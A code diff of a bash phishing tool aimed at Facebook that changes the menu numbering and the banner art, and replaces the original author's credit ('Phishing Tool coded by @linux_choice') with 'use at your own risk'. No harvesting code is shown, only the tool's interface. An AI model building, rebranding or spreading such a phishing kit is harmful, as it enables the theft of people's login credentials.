@@ -16,7 +16,7 @@ command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not inst
 }
 
 menu() {
-printf "\e[1;92m[\e[0m\e[1;77m0\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m\n"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
 
 
@@ -71,14 +71,14 @@ printf "\e[1;77m   ██║  ██║██║     ██╔══██╗█
 printf "\e[1;77m   ███████║██║     ██████╔╝███████║███████║\e[0m\n"
 printf "\e[1;77m   ╚════██║██║     ██╔═══╝ ██╔══██║╚════██║\e[0m\n"
 printf "\e[1;77m        ██║███████╗██║     ██║  ██║     ██║\e[0m\n"
- printf "\e[1;77m       ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝     ╚═╝V.1.0\e[0m\n"
- printf "\e[1;77m           CODED BY Akshay alpha           \e[0m\n"                 
+ printf "\e[1;77m        ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝     ╚═╝V.1.0\e[0m\n"
+ printf "\e[1;77m             CODED BY Akshay alpha           \e[0m\n"                 
 
 
 
 
 
-printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool coded by:  @linux_choice \e[0m\e[1;93m.:.:.\e[0m\n"
+printf "\e[1;93m       .:.:.\e[0m\e[1;77m use at your own risk \e[0m\e[1;93m.:.:.\e[0m\n"
 printf "\n"
 printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
 printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by This tool ::\e[0m\n"
